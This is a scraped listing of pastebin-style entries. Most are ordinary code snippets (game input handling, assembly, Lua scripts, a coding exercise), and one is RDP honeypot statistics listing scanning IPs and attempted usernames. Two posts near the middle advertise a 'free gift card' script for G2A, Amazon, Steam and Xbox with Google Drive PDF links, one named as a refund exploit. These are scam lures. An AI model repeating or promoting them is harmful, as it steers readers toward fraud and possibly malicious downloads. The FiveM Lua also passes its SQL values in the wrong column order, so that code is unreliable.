id,title,username,language,date,content
xSmm2QWg,2024-04-04_stats.json,rdp_snitch,JSON,Thursday 4th of April 2024 07:15:09 PM CDT,"{
  ""ip"": {
    ""45.227.254.54"": 2,
    ""81.19.135.47"": 3,
    ""103.57.220.167"": 1,
    ""39.105.102.119"": 3,
    ""58.218.204.183"": 3,
    ""142.4.218.114"": 1,
    ""45.227.254.9"": 4,
    ""213.32.39.44"": 1,
    ""205.210.31.254"": 3,
    ""87.251.75.145"": 4,
    ""159.65.111.44"": 4,
    ""104.237.141.80"": 1,
    ""112.4.139.162"": 2,
    ""194.28.115.243"": 3,
    ""185.170.144.3"": 2,
    ""159.89.238.156"": 4,
    ""64.225.40.165"": 1,
    ""205.210.31.143"": 3,
    ""194.165.16.37"": 2,
    ""103.149.27.222"": 2,
    ""116.140.196.215"": 1,
    ""38.255.43.130"": 6,
    ""198.135.49.131"": 1,
    ""96.8.115.25"": 1,
    ""91.238.181.16"": 2,
    ""205.210.31.98"": 3,
    ""212.70.149.146"": 1,
    ""196.190.117.7"": 1,
    ""199.45.154.23"": 1,
    ""62.204.41.222"": 2,
    ""103.20.97.235"": 2,
    ""80.94.95.121"": 6,
    ""205.210.31.244"": 3,
    ""92.51.2.11"": 1,
    ""52.149.219.213"": 1
  },
  ""asn"": {
    ""AS267784"": 6,
    ""AS209588"": 4,
    ""AS135905"": 1,
    ""AS37963"": 3,
    ""AS4134"": 3,
    ""AS16276"": 2,
    ""AS396982"": 12,
    ""AS208091"": 4,
    ""AS14061"": 9,
    ""AS63949"": 1,
    ""AS56046"": 2,
    ""AS50968"": 3,
    ""AS197414"": 2,
    ""AS48721"": 2,
    ""AS135377"": 2,
    ""AS4837"": 1,
    ""AS213122"": 6,
    ""AS396073"": 1,
    ""AS36352"": 1,
    ""AS49434"": 2,
    ""AS204428"": 7,
    ""AS24757"": 1,
    ""AS398722"": 1,
    ""AS59425"": 2,
    ""AS150880"": 2,
    ""AS8075"": 1
  },
  ""isp"": {
    ""Flyservers S.A."": 12,
    ""INET"": 1,
    ""Hangzhou Alibaba Advertising Co"": 3,
    ""Chinanet"": 3,
    ""OVH SAS"": 2,
    ""Google LLC"": 12,
    ""Xhost Internet Solutions LP"": 6,
    ""DigitalOcean, LLC"": 9,
    ""Akamai Technologies, Inc."": 1,
    ""China Mobile Communications Corporation"": 2,
    ""Hostmaster, Ltd."": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""China Unicom CHINA169 Network"": 1,
    ""Hyonix LLC"": 6,
    ""Majestic Hosting Solutions, LLC"": 1,
    ""HostPapa"": 1,
    ""Datacenter location PAR1 France"": 2,
    ""SS-Net"": 7,
    ""Ethiotelecom"": 1,
    ""Censys, Inc."": 1,
    ""Horizon LLC"": 2,
    ""Fast Byte Fast Data Company Limited"": 2,
    ""Microsoft Corporation"": 1
  },
  ""org"": {
    ""UAB Host Baltic"": 6,
    ""Alviva Holding Limited"": 4,
    ""iNET Media Company Limited"": 1,
    ""Aliyun Computing Co., LTD"": 3,
    ""Chinanet JS"": 3,
    ""OVH Hosting, Inc."": 1,
    ""ONYPHE"": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""Xhost Internet Solutions"": 4,
    ""DigitalOcean, LLC"": 5,
    ""Linode"": 1,
    ""China Mobile Communications Corporation"": 2,
    ""Network Systems Ltd"": 3,
    ""Xhostis"": 2,
    ""Digital Ocean"": 4,
    ""Flyservers S.A"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""China United Network Communications Corporation Limited"": 1,
    ""Hyonix LLC"": 6,
    ""Majestic Hosting Solutions, LLC"": 1,
    ""Michael Charlery"": 1,
    ""ThinkTech Technology Industrial CO. Limited"": 2,
    ""4Media Ltd"": 1,
    ""Unknown"": 1,
    ""Censys, Inc."": 1,
    ""Horizon LLC"": 2,
    ""FASTBYTE"": 2,
    ""Unmanaged LTD"": 6,
    ""Microsoft Azure Cloud (eastus)"": 1
  },
  ""regionName"": {
    ""Vilnius"": 6,
    ""Hesse"": 4,
    ""Hanoi"": 1,
    ""Beijing"": 4,
    ""Jiangsu"": 5,
    ""Quebec"": 1,
    ""Hauts-de-France"": 1,
    ""California"": 23,
    ""North Holland"": 9,
    ""Texas"": 3,
    ""New Jersey"": 4,
    ""Kaunas"": 2,
    ""Kowloon"": 2,
    ""\u00cele-de-France"": 2,
    ""Sliven"": 1,
    ""Addis Ababa"": 1,
    ""New York"": 1,
    ""Moscow"": 2,
    ""Ho Chi Minh"": 2,
    ""Budapest"": 6,
    ""Virginia"": 1
  },
  ""country"": {
    ""Lithuania"": 8,
    ""Germany"": 4,
    ""Vietnam"": 3,
    ""China"": 9,
    ""Canada"": 1,
    ""France"": 3,
    ""United States"": 32,
    ""The Netherlands"": 9,
    ""Hong Kong"": 2,
    ""Bulgaria"": 1,
    ""Ethiopia"": 1,
    ""Russia"": 2,
    ""Hungary"": 6
  },
  ""account"": {
    ""Test"": 10,
    ""Domain"": 9,
    ""hello"": 19,
    ""Administrator"": 2,
    ""Administr"": 13,
    ""LAzMmQvWO"": 1,
    ""RUzuvF"": 1,
    ""fvMDbb"": 1,
    ""py7rg35i"": 4,
    ""beio"": 2,
    ""(empty)"": 5,
    ""rkakzxjj"": 4,
    ""sjLzaDNbs"": 1,
    ""JRAEdR"": 1,
    ""zlUxGk"": 1,
    ""QLwdasv"": 1,
    ""PVqnzEmBs"": 1,
    ""bRQrgf"": 1,
    ""OBbZkd"": 1,
    ""jZLppxquX"": 1,
    ""bBxsax"": 1,
    ""hoXVgA"": 1
  },
  ""keyboard"": {
    ""Unknown"": 81
  },
  ""client_build"": {
    ""Unknown"": 81
  },
  ""client_name"": {
    ""Unknown"": 81
  },
  ""ip_type"": {
    ""Unknown"": 42,
    ""hosting"": 29,
    ""hosting & proxy"": 8,
    ""mobile"": 2
  }
}"
6V7x5zv3,Untitled,imk0tter,C++,Thursday 4th of April 2024 06:56:30 PM CDT,"void IN_MouseMove ( float frametime, usercmd_t *cmd)
{
	int		mx, my;
	vec3_t viewangles;

	double mouse_x2, mouse_y2;

	gEngfuncs.GetViewAngles( (float *)viewangles );

	// Ricochet: Don't let them move the mouse when they're in spectator mode
	int iSpectator = !bCanMoveMouse();

	//jjb - this disbles normal mouse control if the user is trying to 
	//      move the camera
	if ( !iMouseInUse && !g_iVisibleMouse && !iSpectator )
	{
		GetCursorPos (&current_pos);
		IN_ResetMouse();

		mx = (current_pos.x - gEngfuncs.GetWindowCenterX());
		my = (current_pos.y - gEngfuncs.GetWindowCenterY());
		if (cl_acceleration->value == 0) 
		{
				mouse_x2 = TRANSFORM_ORB_PIXELS_TO_DEGREES(mx, SCREEN_WIDTH, gHUD.m_iFOV, sensitivity->value);
				mouse_y2 = TRANSFORM_ORB_PIXELS_TO_DEGREES(my, SCREEN_HEIGHT, gHUD.m_iFOV, sensitivity->value);
		}
		else
		{
				mouse_x2 = mx == 0 ? 0 : TRANSDUCE_PIXELS_TO_DEGREES(mx, SCREEN_WIDTH, gHUD.m_iFOV, sensitivity->value);
				mouse_y2 = my == 0 ? 0 : TRANSDUCE_PIXELS_TO_DEGREES(my, SCREEN_HEIGHT, gHUD.m_iFOV, sensitivity->value);
		}
		// add mouse X/Y movement to cmd
		if ((in_strafe.state & 1) || (lookstrafe->value && (in_mlook.state & 1)))
		{
			cmd->sidemove += mouse_x2;
			//cmd->sidemove += m_side->value * mouse_x;
		}
		else
		{
			viewangles[YAW] -= mouse_x2;
			//viewangles[YAW] -= m_yaw->value * mouse_x;
		}
		if ( in_mlook.state & 1)
		{
			V_StopPitchDrift ();
		}
		
		if ( (in_mlook.state & 1) && !(in_strafe.state & 1))
		{
			viewangles[PITCH] += mouse_y2;

			//viewangles[PITCH] += m_pitch->value * mouse_y;
			if (viewangles[PITCH] > cl_pitchdown->value)
			{
				viewangles[PITCH] = cl_pitchdown->value;
			}
			if (viewangles[PITCH] < -cl_pitchup->value)
			{
				viewangles[PITCH] = -cl_pitchup->value;
			}
		}
		else
		{
			if ((in_strafe.state & 1) && gEngfuncs.IsNoClipping() )
			{
				cmd->upmove -= mouse_y2;
				//cmd->upmove -= m_forward->value * mouse_y;
			}
			else
			{
				cmd->forwardmove -= mouse_y2;
				//cmd->forwardmove -= m_forward->value * mouse_y;
			}
		}
	}

	gEngfuncs.SetViewAngles( (float *)viewangles );

/*
//#define TRACE_TEST
#if defined( TRACE_TEST )
	{
		int mx, my;
		void V_Move( int mx, int my );
		IN_GetMousePos( &mx, &my );
		V_Move( mx, my );
	}
#endif
*/
}
"
KEESVhZn,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,ssss50w,GetText,Thursday 4th of April 2024 06:45:52 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
 
Working as of:
05 April 2024"
0xGmvb46,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,jusst2k4,GetText,Thursday 4th of April 2024 06:36:45 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_766856.pdf

Working as of:
04 April 2024"
KjkKtbRU,6.Format the Text,Silviya7,JavaScript,Thursday 4th of April 2024 06:34:37 PM CDT,"function solve() {

  const Inputtext= document.querySelector('#input').value;
  const Outputttext= document.querySelector('#output');
  const ArrSentence= Inputtext.split('.');

  let counts=0;
  let NewArr=[];

  for (const el of ArrSentence) {
     
    let isString=false;
    const innerArr= el.split(' ');
    for (const el2 of innerArr) {
      if(typeof el2== 'string' && el2 !=''){
        counts++;
        isString= true;
        break;
        
      }
    }
    if(isString){
      NewArr.push(el);
    }
   
  }

  let AllNewText='';
  let currentsen='';
  let countsent=0;
  let NewArrwithgroup=[];

  for (let i = 0; i < NewArr.length; i++) {
    countsent++;
    if( countsent %3==0){
      currentsen +=NewArr[i]+'.'
      NewArrwithgroup.push(`<p>${currentsen.trim()}</p>`);
      currentsen='';
      countsent=0;
    }
    else{
      currentsen +=NewArr[i]+'. '
    }
   
  }

  if(currentsen !=''){
    NewArrwithgroup.push(`<p>${currentsen.trim()}</p>`);
  }
  let result=NewArrwithgroup.join('\n');
  Outputttext.innerHTML=result;
}"
UbA37bCZ,spr2024 postponed as hell,glokyfull,Motorola 68000 HiSoft Dev,Thursday 4th of April 2024 06:25:15 PM CDT,"
;
; routine de sprite jamais fini
; taille quelquonque
; 2 plan masqué sur 2 plan
;
;
;
;


	BSS
*
maskW	ds.w 1
maskB	ds.w 1
motif	ds.w 2
*
largeurSprite	ds.w 1
hauteurSprite	ds.w 1
adrsprite	ds.l 1

listmask

	DATA


	TEXT

createCodeGen
	move.l adrsprite,a0
	lea spritebuffer,a1
	move.w largeurSprite,d0
	move.w hauteurSprite,d1
	moveq #0,d4
.copySprite
	move.w d1,d6
	subq.w #1,d6
.loopLigne
	move.w d0,d7
	subq #1,d7
.loopLarg
	move.l (a0)+,d2		; plan 0 plan 1
	move.l d2,(a1)+
	dbf d7,.loopLarg
	move.l d4,(a1)+
	dbf d6,.loopLigne

	lea spritebuffer,a0
	jsr makecodeGen

	jsr rollingSprite




rollingSprite
	lea spritebuffer,a0
	move.w largeurSprite,d2
	add d2,d2
	add d2,d2
	addq.w #4,d2		; +1

	move.w hauteursprite,d1
	subq #1,d1
	move.l a0,a1
.loopligne
	move.w largeurSprite,d0
	;subq #1,d0
	move.b #0,ccr
.looprolplan0
	roxr (a0)
	lea 4(a0),a0
	dbf d0,.looprolplan0

	lea 2(a1),a0			; selection plan 2
	move.w largeurSprite,d0
	move.b #0,ccr
.looprolplan1
	roxr (a0)
	lea 4(a0),a0
	dbf d0,.looprolplan1

	add d2,a1
	move.l a1,a0
	dbf d1,.loopligne
	rts

makecodeGen
	; analyse des masque
	move.w hauteursprite,d0
	move.w largeursprite,d1
	add.w d1,d1
	add.w d1,d1
	

	lea maskW,a5
	lea spritebuffer,a0
	move.l a0,a1
	lea listemaskcol,a1
	move.w hauteursprite,d0
	subq.w #1,d0
	moveq #0,d4
.loopmask
	move.w (a0)+,d2
	move.w d2,4(a5)		motif
	move.w (a0)+,d3
	move.w d3,6(a5)
	or.w d3,d2
	move.w d2,(a5)

	
	move.w d4,(a1)+			; numero de masque
	move.w d2,(a1)+		;   masque ajoute a la liste des masque nb ligne fois
	addq.w #1,d4
	add d1,a0
	dbf d0,.loopmask
	move.w #-1,(a1)+	; marqueur de fin
	move.w #0,(a1)+


	move.w hauteursprite,d0
	subq.w #1+1,d0
	lea listemaskcol,a1
	move.l a1,a2
	lea listeoccurmask,a3

	listeposmask,a4

	move.w (a1),d4 		;et pas (a1)+   ; numero de masque
	move.w 2(a1),d2 	; masque

	moveq #0,d5
.search
	move.w (a1)+,d4			; numero de masque
	tst.w d4 
	bmi.s .suite
	move.w (a1)+,d3			; masque
	cmp.w d2,d3
	bne.s .1
	move.w d4,(a4)+			; numero dans la liste qu'il faudra enlever
	move.w #$4e71,-4(a1)	; on met un marqueur dans la liste numero de masque, masque
	addq.w #1,d5			; nombre d'occurence du masque
.1	
	bra.s .search
.suite
	move.w #-1,(a4)+
; dans a4: liste numero de masque semblable le numero de masque seulement
; dans d2: masque

; on compare le nombre d'occurence
	cmp.w #3,d5
	bgt.s .2
; ici d5>3 iteration de masque
	
.2
	bsr testmaskd2
	lea listeposmask,a4
; retire de la liste des masque
	lea listemaskcol,a1
.boucle1

	move.w (a4)+,d4
	tst.w d4
	bmi.s .suite2			
	move.w (a1)+,d5
	addq.l #2,a1
	cmp.w d4,d5
	beq.s .suprime
	bra.s .boucle1
.suprime

	move.l a1,a3
	lea -4(a1),a1
	move.l a1,a5
.3	move.w (a3)+,d7
	tst.w d7
	bmi.s .termine
	swap d7
	move.w (a3)+,d7

	move.l d7,(a1)+
	bra.s .3
.termine
	move.l #$FFFF0000,(a1)+
	move.l a5,a1
	bra.s .boucle1
.suite2


clearoccurence4e71
	lea listemaskcol,a1
	move.l a1,a2
.loop
	move.w (a2)+,d0
	tst.w d0
	bmi.s .finloop
	move.w (a2)+,d1
	cmp.w #$4e71,d0
	bne.s .1
.0	move.w (a2)+,d0
	bmi.s .finloop
	move.w (a2)+,d1
	cmp.w #$4e71,d0
	beq.s .0
.1	move.w d0,(a1)+
	move.w d1,(a1)+
	bra.s .loop
.finloop
	move.l #$FFFF0000,(a1)+
	rts




testmaskd2
	move.w d2,d3		; d3 = masque
	not.w d3			; not mask
	tst.w d3			; mask = FFFF ? <=> not mask = 0
	beq.s .labelFFFF
	not.w d3			,not not mask = mask
	move.w d3,d6
	tst.b d3			; XX00
	beq.s .labelaa00
	; d3.b contient quelquechose
	rol.w #8,d3
	tst.b d3
	beq.s .label00aa
	move.w d6,d3

.labelaabb
	; and.l #maskmask,dep(a0)		; separable
	; or.l #orvalue,dep(a0)
	st.b flagMaskLong
	sf.b flagMaskWord
	st.b separable
	sf.b nomask
	rts
.labelaa00
	cmp.w #$FF00,d3
	beq.s .labelFF00
	; movep.w dep(a0),d6
	; and.w #valueFF,d6
	; or.w #value00,d6
	; movep.w d6,dep(a0)
	sf.b flagMaskLong
	st.b flagMaskWord
	sf.b separable			; n'est pas separable du bitmap a or-é
	sf.b nomask
	rts
.labelFF00
	; no mask
	move.w #valuevalue,d6
	movep.w d6,dep(a0)
	st.b nomask
	rts
.label00aa
	move.w d6,d3
	cmp.w #$00FF,d3
	beq.s .label00FF
	 movep.w dep+1(a0),d6
	 and.w #aaaa,d6
	 or.w #value,d6
	 movep.w d6,dep+1(a0)
	 st.b flagMaskWord
	 sf.b flagMaskLong
	 sf.b separable
	 sf.b nomask

	rts
.label00FF
	; move.w #aaaa,d6
	; movep.w d6,1+dep(a0)
	
	

	move.w d6,d3
	and.w #$00FF,d3
	tst.w d3
	beq.s .labelFF00
.other
	; masquage normal (?)
	cmp.w #3,d4			; nombre d'occurence >=3 occurence ?
	bsr serialmasquage
	bra.s .suite
	
.labelFFFF
	; move.l #value,dep(a0), pas de masquage donc on oublie les masque
.label00FF
	move.w #valuevalue,d6
	movep.w d6,dep+1(a0)		; pas de masquage non plus
.labelFF00
	move.w #valuevalue,d6
	movep.w d6,dep(a0)
	
	
"
B0jv7W4B,Untitled,Zeinab_Hamdy,C++,Thursday 4th of April 2024 05:43:55 PM CDT,"#include<bits/stdc++.h>
using namespace std;
#define nl ""\n""
#define fi first
#define se second
#define pb push_back
#define ll long long
#define ull unsigned ll
#define RV  return void
#define sz(x) int(x.size())
#define all(v) v.begin(), v.end()
#define rall(v) v.rbegin(), v.rend()
#define fixed(n) fixed << setprecision(n)
#define cin(v) for (auto&i:v) cin >> i;
#define cout(v) for (auto&i:v) cout << i << "" "";
#define clr(memo, x) memset(memo, x, sizeof memo)
#define FastCode ios_base::sync_with_stdio(false); cin.tie(nullptr); cout.tie(nullptr);
 
void  Zainab(){
            // #ifndef ONLINE_JUDGE
              // freopen(""hobz.in"", ""r"", stdin);
              // freopen(""longpath.out"", ""w"", stdout);
            // #endif
}


void myCode( ){

ll n ;
    cin >>n ;
    vector < ll > v(n) , pref(n+1,1 ) , suff(n+1,1);
    cin(v);
    
    for(int i=0 ; i < n ; i++){
        pref[i] = v[i];
        if(i) pref[i] = __gcd(pref[i-1] , pref[i]);
    }
    
    for(int i=n-1 ;i >=0 ; i--){
        suff[i] = v[i];
        if(i != n-1) 
            suff[i] = __gcd(suff[i+1] , suff[i]);
    }
    
    ll ans=1;
    map < ll , ll > saved;
    for(int i =0; i < n ; i++){
        ll tx = suff[i+1];
        if(i)
            tx = pref[i-1];
        
        ll gc = __gcd( tx , suff[i+1]) 
        , gc2 = __gcd(v[i] , gc)
        , fin = gc/gc2
        , mx =1;
        
        
        if(saved[fin]) 
            mx = saved[fin];
        
        else{
            for(ll j =2 ; j*j <= fin ; j+= 1 + (j &  1)){
                if(fin % j == 0){
                    mx = max(mx , j);
                    
                    while(fin % j ==0)
                        fin/=j;
                }
            }
                 
            if( fin > 1)
                mx = max(mx , fin);
        }
       
        saved[gc/ gc2] = mx;
        ans = max(ans , __gcd(gc , mx*gc2));
            
            // cout << i << "" "" << gc << "" "" << gc2 << "" "" << mx << nl;
    }
    
   


    cout << ans << nl;

    
}
 
 
int main(){
                                   FastCode ;

    int testCase=1;
          cin >> testCase ;
      for(int i=1 ; i<= testCase ; i++)
        myCode();
 
    return 0;
}"
0XU3TtqD,[App] autoRefuel.lua,Le_JuiceBOX,Lua,Thursday 4th of April 2024 05:04:54 PM CDT,"-- 0XU3TtqD
local Terminal = require(""/terminal"").new()
local diff = 0
function Main()
    writeText()
    repeat
        Terminal:reset()  
        writeText()
        local res = Terminal:promptConf(""Auto-refuel turtle?"",true)
        if res then
            turtle.select(1)
            repeat
                local isFull = (turtle.getFuelLevel() >= turtle.getFuelLimit())
                if isFull == false then
                    for i = 1, 16 do
                        turtle.select(i)
                        turtle.suckUp()
                    end
                
                    for i = 1, 16 do
                        turtle.select(i)
                        turtle.refuel()
                        turtle.dropDown()
                        writeText()
                    end
                end
            until isFull
        else
            return
        end
        turtle.select(1)
        writeText()
        Terminal:print()
        Terminal:pressAnyKeyToContinue()
    until res == false
end

function writeText()
    local fuelLevel = turtle.getFuelLevel()
    local fuelLimit = turtle.getFuelLimit()
    local fuelPercent = math.floor((fuelLevel/fuelLimit)*100)
    diff = fuelLimit - fuelLevel
    Terminal:reset()
    Terminal:print(""Turtle fuel level:"")
    Terminal:print()
    Terminal:print(tostring(fuelLevel.."" / ""..fuelLimit.."" &8(""..fuelPercent..""%)""))
    Terminal:print()
    Terminal:print(""Lava Buckets&8..&0x""..math.ceil(diff/1000))
    Terminal:print(""Coal&8..........&0x""..math.ceil(diff/160))
    Terminal:print(""Kelp&8..........&0x""..math.ceil(diff/100))
    Terminal:print()
end

Main()"
b5kk03sn,Untitled,retroman,FreeBasic,Thursday 4th of April 2024 04:42:20 PM CDT,"dim as string mystr = ""hello world""
	for i as integer = 1 to 50 step 1
	color 4
		print "" ""+mystr
		sleep 20
		locate 1,abs(i)+1,0
	next
color 7"
Br1FHXRB,JG X ESX_PROPERTY,Lindholmbrahe,Lua,Thursday 4th of April 2024 04:39:29 PM CDT,"RegisterNetEvent('esx_property:server:createProperty', function(Property)
  local source = source
  local xPlayer = ESX.GetPlayerFromId(source)
  local Interior = GetInteriorValues(Property.interior)
  local garageData =
    Property.garage.enabled and {enabled = true, pos = Property.garage.pos, Heading = Property.garage.heading, StoredVehicles = {}} or
      {enabled = false}
  if IsPlayerAdmin(source, ""CreateProperty"") then
    local ActualProperty = {
      Name = Property.name, 
      setName = """", 
      Price = Property.price, 
      furniture = {}, 
      plysinside = {}, 
      Interior = Property.interior,
      Entrance = Property.entrance, 
      Owner = """", 
      Keys = {}, 
      positions = Interior.positions, 
      cctv = Property.cctv,
      garage = garageData, 
      Owned = false, 
      Locked = false
                          }
    Properties[#Properties + 1] = ActualProperty
    local owners = {
      {
      identifier = xPlayer.getIdentifier(),
      name = xPlayer.getName(),
      id = source
      }
    }
    MySQL.Async.execute(""INSERT INTO player_priv_garages (owners, name, type, x, y, z, h, distance) VALUES (@owners, @type, @name, @x, @y, @z, @h, @distance)"",
      {[""@owners""] = json.encode(owners), [""@type""] = ""private"", [""@name""] = Property.name, [""@x""] = Property.garage.pos.x, [""@y""] = Property.garage.pos.y,
       [""@z""] = Property.garage.pos.z, [""@h""] = Property.garage.heading, [""@distance""] = 10}, function()
      end)

  end
  Log(""Property Created"", 65280,
    {{name = ""**Admin**"", value = xPlayer.getName(), inline = true}, {name = ""**Name**"", value = Property.name, inline = true},
     {name = ""**Price**"", value = ESX.Math.GroupDigits(Property.price), inline = true},
     {name = ""**Interior**"", value = Interior.label, inline = true},
     {name = ""**Garage Status**"", value = Property.garage.enabled and ""Enabled"" or ""Disabled"", inline = true},
     {name = ""**CCTV Status**"", value = Property.cctv.enabled and ""Enabled"" or ""Disabled"", inline = true},
     {name = ""**Entrance**"", value = tostring(Property.entrance.x .. "", "" .. Property.entrance.y .. "", "" .. Property.entrance.z), inline = true}}, 1)
  TriggerClientEvent(""esx_property:syncProperties"", -1, Properties)
end)"
